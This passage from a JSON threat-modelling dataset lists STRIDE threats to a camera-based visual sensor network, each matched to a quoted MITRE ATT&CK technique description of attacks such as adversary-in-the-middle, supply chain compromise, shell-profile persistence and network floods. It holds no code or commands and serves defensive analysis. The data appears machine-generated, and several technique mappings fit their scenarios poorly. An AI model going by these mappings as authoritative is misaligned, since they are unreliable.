Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker alters visual data being transmitted between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted",
                    "Role": "Network Engineer",
                    "Condition": "Data sent over the network is in plaintext."
                },
                {
                    "Assumption": "Attacker can intercept and modify transmitted data",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the network and tools to modify data in transit."
                },
                {
                    "Assumption": "Endpoints do not verify data integrity",
                    "Role": "System Developer",
                    "Condition": "Nodes and servers accept data without integrity checks."
                }
            ],
            "Potential Impact": "Compromise of data integrity, leading to misinformation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthenticated software updates lead to malicious software being installed on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes do not verify software updates",
                    "Role": "System Developer",
                    "Condition": "Nodes accept updates without verification."
                },
                {
                    "Assumption": "Attacker can induce updates from a malicious source",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the update mechanism or URL."
                },
                {
                    "Assumption": "Central management server does not enforce update authenticity",
                    "Role": "Network Administrator",
                    "Condition": "Update mechanism lacks cryptographic validation."
                }
            ],
            "Potential Impact": "Loss of system integrity and potential for backdoors.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software update",
                "camera node",
                "malicious software"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromise of central server configuration files, altering system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Central server does not use proper access controls",
                    "Role": "System Administrator",
                    "Condition": "Configuration files are accessible without strict permissions."
                },
                {
                    "Assumption": "Attacker gains access to the central server",
                    "Role": "Attacker",
                    "Condition": "Server security is compromised or credentials are stolen."
                },
                {
                    "Assumption": "Backup configurations are not securely stored",
                    "Role": "Network Engineer",
                    "Condition": "Backup files are not protected or monitored."
                }
            ],
            "Potential Impact": "Disruption of system operations and potential loss of control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "server",
                "system behavior"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies uploading malicious firmware, causing nodes to malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not capture sufficient details for non-repudiation",
                    "Role": "System Developer",
                    "Condition": "Logging mechanisms are insufficient or incomplete."
                },
                {
                    "Assumption": "Firmware updates are not securely audited",
                    "Role": "Network Administrator",
                    "Condition": "Update processes lack proper audit trails."
                },
                {
                    "Assumption": "User roles and permissions are not strictly enforced",
                    "Role": "System Administrator",
                    "Condition": "Permissions are loosely defined or enforced."
                }
            ],
            "Potential Impact": "Inability to pinpoint the culprit and enforce accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "firmware update",
                "audit"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrator claims not to have altered system logs, obscuring an incident.",
            "Assumptions": [
                {
                    "Assumption": "System logs can be edited without detection",
                    "Role": "System Administrator",
                    "Condition": "Logging system lacks protection against tampering."
                },
                {
                    "Assumption": "Access to logs is not properly controlled",
                    "Role": "Network Engineer",
                    "Condition": "Permissions to access or alter logs are lax."
                },
                {
                    "Assumption": "Log entries are not time-stamped with integrity checks",
                    "Role": "System Developer",
                    "Condition": "Logs do not include tamper-evident time-stamps."
                }
            ],
            "Potential Impact": "Loss of evidence for security incidents and inability to enforce accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "audit trail",
                "alter"
            ],
            "mitre_technique": {
                "name": "Impair Defenses",
                "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Emotet shutdown)\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
                "id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
                "technique_id": "T1562"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User claims they did not access specific data compromising data integrity.",
            "Assumptions": [
                {
                    "Assumption": "Access control logs are insufficient",
                    "Role": "System Administrator",
                    "Condition": "Access control mechanisms do not log accesses adequately."
                },
                {
                    "Assumption": "Data access policies are not strictly monitored",
                    "Role": "Network Administrator",
                    "Condition": "Policies and logs are not frequently reviewed or verified."
                },
                {
                    "Assumption": "No two-factor authentication for data access",
                    "Role": "System Architect",
                    "Condition": "Authentication for accessing sensitive data is weak."
                }
            ],
            "Potential Impact": "Loss of data integrity and challenges in establishing responsibility.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data access",
                "integrity",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker captures visual data in transit between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted unencrypted",
                    "Role": "System Developer",
                    "Condition": "Visual data is sent over the network without encryption."
                },
                {
                    "Assumption": "Attacker has access to network traffic",
                    "Role": "Attacker",
                    "Condition": "Network is compromised or traffic is monitored by the attacker."
                },
                {
                    "Assumption": "No secure communication protocols in place",
                    "Role": "Network Engineer",
                    "Condition": "Communication protocols lack security features like TLS."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality and potential data breach.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "data in transit",
                "visual data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker accesses sensitive visual data stored on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes store visual data locally",
                    "Role": "System Architect",
                    "Condition": "Nodes are configured to store data for a period."
                },
                {
                    "Assumption": "Stored data lacks encryption",
                    "Role": "System Developer",
                    "Condition": "Data at rest is not encrypted on the nodes."
                },
                {
                    "Assumption": "Nodes have security vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Nodes are susceptible to known vulnerabilities."
                }
            ],
            "Potential Impact": "Breach of data confidentiality and potential misuse of captured data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "stored data",
                "visual data",
                "camera node"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized user gains access to configuration files revealing network topology and security details.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not properly secured",
                    "Role": "System Administrator",
                    "Condition": "Files are accessible without strict permissions."
                },
                {
                    "Assumption": "Attacker has elevated access privileges",
                    "Role": "Attacker",
                    "Condition": "Attacker has or gains elevated permissions within the system."
                },
                {
                    "Assumption": "Lack of network segmentation",
                    "Role": "Network Engineer",
                    "Condition": "Sensitive data and configuration files are not isolated."
                }
            ],
            "Potential Impact": "Compromise of network security details leading to further attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "configuration files",
                "network topology",
                "security details"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacker floods the network with traffic, preventing camera nodes from communicating with the central server.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks rate limiting controls",
                    "Role": "Network Engineer",
                    "Condition": "Traffic management is not implemented or inadequate."
                },
                {
                    "Assumption": "Camera nodes do not have local failover mechanisms",
                    "Role": "System Developer",
                    "Condition": "Nodes rely solely on central server communication."
                },
                {
                    "Assumption": "Central server cannot handle high traffic volumes",
                    "Role": "System Architect",
                    "Condition": "Server is not scaled for high traffic."
                }
            ],
            "Potential Impact": "Disruption of system operations and potential data loss due to unresponsive nodes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network traffic",
                "server",
                "flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of a known vulnerability causing system crashes on camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities are unpatched on nodes",
                    "Role": "System Administrator",
                    "Condition": "Regular patching and updates are not conducted."
                },
                {
                    "Assumption": "Attacker has knowledge of vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Vulnerability information is publicly accessible."
                },
                {
                    "Assumption": "No monitoring for abnormal node behavior",
                    "Role": "Network Engineer",
                    "Condition": "System lacks intrusion detection and anomaly detection."
                }
            ],
            "Potential Impact": "Loss of availability of camera nodes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "system crash",
                "camera node"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects IoT devices, overloading system resources and causing nodes to fail.",
            "Assumptions": [
                {
                    "Assumption": "Nodes lack antivirus and antimalware protection",
                    "Role": "System Administrator",
                    "Condition": "No security software is installed on camera nodes."
                },
                {
                    "Assumption": "Attacker can distribute malware via a compromised update mechanism",
                    "Role": "Attacker",
                    "Condition": "Update channels are not secured."
                },
                {
                    "Assumption": "Insufficient resource monitoring",
                    "Role": "Network Engineer",
                    "Condition": "System does not track resource usage efficiently."
                }
            ],
            "Potential Impact": "System downtime and operational disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource overload",
                "system failure"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker escalates privileges on camera nodes to alter firmware or configurations.",
            "Assumptions": [
                {
                    "Assumption": "Firmware lacks integrity checks",
                    "Role": "System Developer",
                    "Condition": "No mechanisms are in place to verify firmware integrity."
                },
                {
                    "Assumption": "Nodes run vulnerable software allowing privilege escalation",
                    "Role": "System Architect",
                    "Condition": "Software has known privilege escalation bugs."
                },
                {
                    "Assumption": "No separation of privilege in user roles",
                    "Role": "System Administrator",
                    "Condition": "All users have broad access to node configurations."
                }
            ],
            "Potential Impact": "Compromise of node operations and integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "configuration",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Improperly configured server allows attacker to gain administrative privileges on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Weak server configuration",
                    "Role": "System Administrator",
                    "Condition": "Server is not secured following best practices."
                },
                {
                    "Assumption": "Attacker has access to the server network",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised, or attacker has physical access."
                },
                {
                    "Assumption": "Lack of multi-factor authentication",
                    "Role": "System Architect",
                    "Condition": "Administrative access does not require multi-factor authentication."
                }
            ],
            "Potential Impact": "Full control over VSN leading to data manipulation or DDoS.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server",
                "administrative privileges",
                "configuration"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploit chain on Linux-based nodes leading to code execution with root privileges.",
            "Assumptions": [
                {
                    "Assumption": "Nodes run outdated Linux versions with known exploits",
                    "Role": "System Administrator",
                    "Condition": "Nodes are not regularly updated."
                },
                {
                    "Assumption": "Attacker knows and can exploit vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Exploits for vulnerabilities are available."
                },
                {
                    "Assumption": "No security hardening of node OS",
                    "Role": "System Architect",
                    "Condition": "Linux nodes are deployed with default security settings."
                }
            ],
            "Potential Impact": "Compromise of node control and potential spread of malware.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "Linux",
                "code execution",
                "root access"
            ],
            "mitre_technique": {
                "name": "Path Interception by PATH Environment Variable",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
                "technique_id": "T1574.007"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could set up a rogue camera node impersonating a legitimate node to capture visual data.",
            "Assumptions": [
                {
                    "Assumption": "There is no robust mutual authentication mechanism between camera nodes and the VSN management system.",
                    "Role": "Network Administrator",
                    "Condition": "When setting up new camera nodes or updating existing ones."
                },
                {
                    "Assumption": "Attackers have access to the network where legitimate nodes operate.",
                    "Role": "Cybersecurity Analyst",
                    "Condition": "If the network is poorly secured or compromised."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
